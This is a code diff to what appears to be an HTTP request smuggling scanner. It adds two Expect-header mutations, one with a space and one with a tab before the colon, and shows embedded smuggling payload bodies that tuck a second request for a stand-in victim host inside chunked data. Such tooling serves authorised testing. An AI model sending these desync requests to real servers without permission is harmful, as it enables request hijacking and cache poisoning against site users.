@@ -25,6 +25,8 @@ DEFAULT_CONNECTIONS = 100
 MAX_LOG_LINES = 2000
 MUTATION_EXPECT = "CL Expect"
 MUTATION_EXPECT_10 = "EXPECT-1.0"
+MUTATION_EXPECT_SPACE = "Expect-Space"
+MUTATION_EXPECT_TAB = "Expect-Tab"
 MUTATION_HEAD = "CL HEAD"
 MUTATION_CL_OPTIONS = "CL OPTIONS"
 MUTATION_CL_TRACE = "CL TRACE"
@@ -48,7 +50,8 @@ DEFAULT_TE_VALID_TERM_BODY = "20\r\n0\r\n\r\nGET /test%xx HTTP/1.1\r\nX: x\r\n0\
 DEFAULT_TE_BAD_TERM_BODY = "\r\n2;\nxx\r\n30\r\nGET /ad%xx HTTP/1.1\r\nHost: kictim.com\r\n\r\n0\r\n\r\n0\r\n\r\n"
 
 CL_MUTATIONS = [
-    MUTATION_EXPECT, MUTATION_EXPECT_10, MUTATION_HEAD, MUTATION_CL_OPTIONS,
+    MUTATION_EXPECT, MUTATION_EXPECT_10, MUTATION_EXPECT_SPACE,
+    MUTATION_EXPECT_TAB, MUTATION_HEAD, MUTATION_CL_OPTIONS,
     MUTATION_CL_TRACE, MUTATION_CL_GET, MUTATION_CL_CONNECT,
     MUTATION_H2_UPGRADE, MUTATION_CL_BLANK, MUTATION_CL_VALID_TERM,
 ]
@@ -62,6 +65,8 @@ ALL_MUTATIONS = CL_MUTATIONS + TE_MUTATIONS
 MUTATION_METHODS = {
     MUTATION_EXPECT: "POST",
     MUTATION_EXPECT_10: "POST",
+    MUTATION_EXPECT_SPACE: "POST",
+    MUTATION_EXPECT_TAB: "POST",
     MUTATION_HEAD: "HEAD",
     MUTATION_CL_OPTIONS: "OPTIONS",
     MUTATION_CL_TRACE: "TRACE",
@@ -389,6 +394,10 @@ def build_smuggle_request(helpers, raw_request, http_service, body_str, mutation
     # Mutation-specific headers
     if mutation == MUTATION_EXPECT or mutation == MUTATION_EXPECT_10:
         new_headers.append("Expect: 100-Continue")
+    elif mutation == MUTATION_EXPECT_SPACE:
+        new_headers.append("Expect : 100-Continue")
+    elif mutation == MUTATION_EXPECT_TAB:
+        new_headers.append("Expect\t: 100-Continue")
     if mutation == MUTATION_H2_UPGRADE:
         new_headers.append("Connection: Upgrade, HTTP2-Settings")
         new_headers.append("Upgrade: h2c")
